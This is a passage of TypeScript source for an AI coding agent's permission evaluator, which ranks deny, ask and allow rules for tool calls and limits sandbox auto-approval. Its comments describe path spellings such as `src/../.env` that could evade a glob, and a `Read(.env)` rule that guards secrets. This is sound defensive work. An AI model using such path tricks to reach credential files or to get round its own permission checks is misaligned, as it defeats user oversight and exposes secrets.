  // ApplyPatch is the canonical mutation surface, but existing Edit/Write rules
  // remain valid for compatibility. A multi-file patch is allowed only when every
  // target is covered; a deny on any target wins.
  if (toolName === 'ApplyPatch') {
    const operations = patchOperations(args);
    // A Write or Edit rule applies however the patch spells the path (`src/../.env`, absolute).
    // Two sets per target, because `deny`/`ask` are also offered the form relative to an approved
    // root and `allow` is not — see `spellingsOfPath`.
    const spellings = new Map<string, readonly string[]>();
    const restrictiveSpellings = new Map<string, readonly string[]>();
    const spellingsOf = (path: string, restrictive: boolean): readonly string[] => {
      const cache = restrictive ? restrictiveSpellings : spellings;
      let known = cache.get(path);
      if (!known) {
        known = paths ? [path, ...spellingsOfPath(paths, path, false, restrictive)] : [path];
        cache.set(path, known);
      }
      return known;
    };
    const isCompatible = (rule: ParsedRule) =>
      rule.toolName === 'ApplyPatch' || rule.toolName === 'Edit' || rule.toolName === 'Write';
    for (const list of ['deny', 'ask'] as const) {
      for (const entry of parsed[list]) {
        if (!isCompatible(entry.parsed)) continue;
        // `deny` and `ask` fold case on a path, exactly as they do for a `Write` or `Read` that
        // names the same file; `allow` below keeps exact matching, so the fold only ever restricts
        // (PR #334 finding 6).
        if (compatiblePatchRuleMatches(entry.parsed, operations, spellingsOf, true)) {
          return { decision: list, matchedRule: entry.text, source: list };
        }
      }
    }
    const allowRules = parsed.allow.filter(({ parsed: rule }) => isCompatible(rule));
    // Reported exactly as before: the first rule the list declares that names this tool at all,
    // whether or not it is the one that decided the call.
    const firstCompatible = allowRules[0]?.text;
    if (
      operations.length > 0 &&
      operations.every((operation) =>
        allowRules.some(
          ({ parsed: rule }) =>
            patchRuleSupportsOperation(rule, operation) &&
            (rule.pattern === null ||
              ruleMatchesPatch(rule, spellingsOf(operation.path, false), false)),
        ),
      )
    ) {
      return { decision: 'allow', matchedRule: firstCompatible, source: 'allow' };
    }
    if (
      allowRules.some(({ parsed: rule }) => rule.toolName === 'ApplyPatch' && rule.pattern === null)
    ) {
      return { decision: 'allow', matchedRule: firstCompatible, source: 'allow' };
    }
    return { decision: 'ask', source: 'default' };
  }

  const tool = canonicalToolName(toolName);
  // A rule about a file applies however the call spells its path: `Read(.env)` must also stop
  // `D:/ws/.env` and `src/../.env`, which the glob on the raw argument misses. Resolved only when
  // a rule names the tool, since resolving touches the file system.
  const candidates: string[] = [getPrimaryArg(args)];
  let restrictiveCandidates: string[] = candidates;
  if (scope && paths && PATH_RULE_TOOLS.has(tool) && rulesName(parsed, tool)) {
    restrictiveCandidates = [...candidates, ...pathRuleSpellings(paths, tool, args, true)];
    // `allow` is offered only the spellings a `Write` would have written: the raw argument, the
    // path as given, and its canonical form. It is not offered the form relative to an honored
    // root, so a workspace-shaped allow such as `Edit(src/**)` cannot come to mean
    // `/srv/app/src/**` — a grant the user never wrote (PR #334 finding 10).
    candidates.push(...pathRuleSpellings(paths, tool, args, false));
  }
  // `deny` and `ask` restrict, so they fold case for a path-rule tool and take the wider set of
  // spellings; `allow` keeps exact matching, because folding there would widen what a rule
  // permits (#305 item 1).
  const matchesRule = (rule: ParsedRule, fold: boolean): boolean => {
    const pool = fold ? restrictiveCandidates : candidates;
    if (tool === 'WebFetch') {
      try {
        // URL.toString() gives origin roots a trailing slash, matching the remembered origin glob.
        const url = new URL(candidates[0]).toString();
        return ruleMatchesCandidate(rule, tool, url, false);
      } catch {
        // Invalid URLs retain the normal raw-argument matching behavior.
      }
    }
    return pool.some((candidate) => ruleMatchesCandidate(rule, tool, candidate, fold));
  };
  // What a Read, Glob or Grep reaches. Judged wherever a refusal may follow from it: in the modes
  // that judge reads, and in `dontAsk`, which refuses the call regardless and must refuse it with
  // the reason that is actually the blocker. Where reads are not judged at all (`auto`,
  // `bypassPermissions`) this stays undefined and nothing here can refuse early.
  const readTarget =
    scope &&
    paths &&
    (scope.judgeReads || scope.refuseUnreachableReads) &&
    WORKSPACE_READ_TOOLS.has(tool)
      ? readToolTarget(tool, args, paths)
      : undefined;
  const outside = readTarget === 'outside' ? { outsideWorkspace: true as const } : {};

  // Deny rules first, then ask, then allow — every one outranking what follows.
  for (const entry of parsed.deny) {
    if (matchesRule(entry.parsed, true)) {
      return { decision: 'deny', matchedRule: entry.text, source: 'deny' };
    }
  }
  for (const entry of parsed.ask) {
    if (matchesRule(entry.parsed, true)) {
      return { decision: 'ask', matchedRule: entry.text, source: 'ask', ...outside };
    }
  }
  for (const entry of parsed.allow) {
    if (matchesRule(entry.parsed, false)) {
      return { decision: 'allow', matchedRule: entry.text, source: 'allow' };
    }
  }

  // `sandbox.autoAllowBashIfSandboxed` is evaluated last, and only in place of
  // the *default* ask. Every user-written rule outranks it: a matching `deny`
  // has already returned above and can never be softened into an allow (the
  // property the hard-deny check in the agent loop depends on), a matching
  // `ask` still prompts, and — because a shell line evades globs far too easily
  // — a deny/ask list that exists but did not match keeps the default ask too.
  // The setting only removes the prompt Book raises when the user configured no
  // adjudication at all, and only for a command really confined by bubblewrap.
  if (sandboxAutoAllows(toolName, args, settings, options)) {
    return { decision: 'allow', source: 'sandbox' };
  }

  // Reading or searching what the tool can serve needs no prompt in the modes that judge reads
  // (#264); nor does a call with no target at all, which the tool rejects itself with the real
  // reason (a missing argument, or arguments that were not valid JSON). Every user-written rule
  // outranks this: deny and ask returned above.
  if (
    scope?.autoAllowReads &&
    (readTarget === 'none' ||
      (readTarget === 'servable' && (tool === 'Read' || !hasReadAdjudication(parsed))))
  ) {
    return { decision: 'allow', source: 'workspace' };
  }

  // A read-only Git call reports on the workspace root and changes nothing, so it needs no
  // prompt in the modes that judge calls (decision B). Deny and ask already returned above, and
  // a workspace that holds a home directory still asks, the way every other read there does.
  if (scope?.autoAllowReads && WORKSPACE_READ_ONLY_GIT_TOOLS.has(tool)) {
    return { decision: 'allow', source: 'workspace' };
  }

  if (ALWAYS_ALLOWED_TOOLS.has(tool)) {
    return { decision: 'allow', source: 'default' };
  }

  // A target no root contains: the tool refuses it however it is approved, so the call is
  // refused here instead of putting a prompt nobody can satisfy on screen (#305 item 3). An
  // `ask` rule returned above, so a user who named the target still gets asked.
  if (readTarget === 'outside') {
    return { decision: 'refuse', source: 'default', outsideWorkspace: true };
  }

  // A target a root serves but excludes — Book's memory inbox. The tool refuses it whatever the
  // user said, so a prompt here is a question with no possible answer, and the `hidden` verdict
  // that already knew as much used to fall through to the default `ask` (#305 item 3). Refused
  // with its own code, because the remedy is not a directory: the parent is served already.
  if (readTarget === 'hidden') {
    return { decision: 'refuse', source: 'default', excludedPath: true };
  }

  // No rule matched — default to asking.
  return { decision: 'ask', source: 'default' };
}

/**
 * Tools that never prompt: the agent's own memory and its checklist. A `deny`
 * rule still blocks them and an `ask` rule still asks, and `dontAsk` does not
 * refuse them, since it only refuses what it would have had to ask about.
 */
export const ALWAYS_ALLOWED_TOOLS = new Set(['MemorySave', 'TodoWrite']);
